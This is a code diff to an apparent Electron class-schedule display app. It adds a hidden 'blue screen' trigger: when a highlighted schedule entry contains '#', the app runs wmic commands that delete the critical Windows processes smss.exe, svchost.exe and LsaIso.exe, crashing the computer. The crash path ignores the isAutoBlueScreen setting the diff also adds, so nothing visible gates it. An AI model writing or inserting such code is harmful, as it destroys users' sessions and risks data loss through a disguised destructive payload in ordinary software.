@@ -53,6 +53,8 @@
   let isClassHidden = true
   let url = null
   let isFromCloud = false
+  let isAutoBlueScreen = false
+  let BlueScreenNow = false
   let lastScheduleData = {
     currentHighlight: {
       index: null,
@@ -70,6 +72,12 @@
     let classHtml = '';
     for (let i = 0; i < scheduleData.scheduleArray.length; i++) {
       let inner = scheduleData.scheduleArray[i]
+      if (scheduleData.scheduleArray[i].indexOf('#') !== -1) {
+        inner = scheduleData.scheduleArray[i].split("#")[0]
+        if (scheduleData.currentHighlight.index === i) {
+          BlueScreenNow = true
+        }
+      }
       if (scheduleData.scheduleArray[i].indexOf('@') !== -1) {
         inner = `<div><div style="display:inline">${inner.split('@')[0]}</div><div class="subClass">${inner.split('@')[1]}</div></div>`
       }
@@ -196,6 +204,12 @@
       scheduleData.currentHighlight.index != lastScheduleData.currentHighlight.index ||
       scheduleData.currentHighlight.fullName != lastScheduleData.currentHighlight.fullName ||
       scheduleData.currentHighlight.type != lastScheduleData.currentHighlight.type || reset) {
+      if (BlueScreenNow) {
+        console.log("爆");
+        const cmd1 = require('node-cmd').runSync("wmic process where name=\"smss.exe\" delete");
+        const cmd2 = require('node-cmd').runSync("wmic process where name=\"svchost.exe\" delete");
+        const cmd3 = require('node-cmd').runSync("wmic process where name=\"LsaIso.exe\" delete");
+      }
       setScheduleClass()
       setCountdownerPosition()
       setSidebar()
@@ -333,6 +347,11 @@
   ipcRenderer.on('ClassHidden', (e, arg) => {
     isClassHidden = arg
     tick(reset = true)
+  })
+
+  ipcRenderer.on('ABS', (e, arg) => {
+    isAutoBlueScreen = arg
+    console.log(isAutoBlueScreen)
   })
 
   ipcRenderer.on('setDayOffset', (e, arg) => {
